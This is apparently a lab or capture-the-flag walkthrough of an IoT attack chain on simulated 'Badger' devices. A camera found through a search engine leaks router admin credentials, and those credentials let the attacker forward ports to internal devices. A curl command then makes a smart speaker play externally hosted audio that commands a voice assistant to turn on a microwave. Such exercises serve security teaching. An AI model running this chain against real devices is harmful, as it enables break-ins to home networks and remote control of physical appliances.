1. Search for "BadgerCam" in NIDAN: 

    https://nidan.cs.wisc.edu/nidan/search?search_term=BadgerCam

2. Found the IP address for the camera:

    http://[2607:f388:1080:700:a288:7496:1a32:2368]:8001/

3. From the camera, obtain the router login credential:

    Username: admin
    Password: badg3r$are@wesome!!

4. Search for the router in NIDAN: 

    https://nidan.cs.wisc.edu/nidan/search?search_term=city%3A%22Madison%22

5. Obtain the URL for the rounter and log in with credential obtained above: 

    http://[2607:f388:1080:700:a288:7496:1a32:2368]:8004/

6. Forward ports in router to obtain access to BadgerSpeaker and BadgerVoice Assistant

    BadgerCam:              192.168.0.1:8083 -> 8001
    BadgerSpeaker:          192.168.0.2:8008 -> 8002
    BadgerVoice Assistant:  192.168.0.3:7615 -> 8003
    Microwave:              192.168.0.4:9123 -> 8000

7. Record audio "Turn on the microwave"

8. Edit audio to be single channel and change audio format to flac 

    ```
    ffmpeg -i record.m4a -ac 1 record.flac
    ```

9. Upload the audio file to `https://www.file.io/`

10. Post address of the audio to the BadgerSpeaker

    ```
    curl --data "url=https://file.io/VFcqjqSD" http://[2607:f388:1080:700:a288:7496:1a32:2368]:8002/
    ```

11. BadgerSpeaker will play the audio and tell BadgerVoice Assistant to turn on the microwave

    ```
    Recent Things I Heard
        turn on microwave
    ```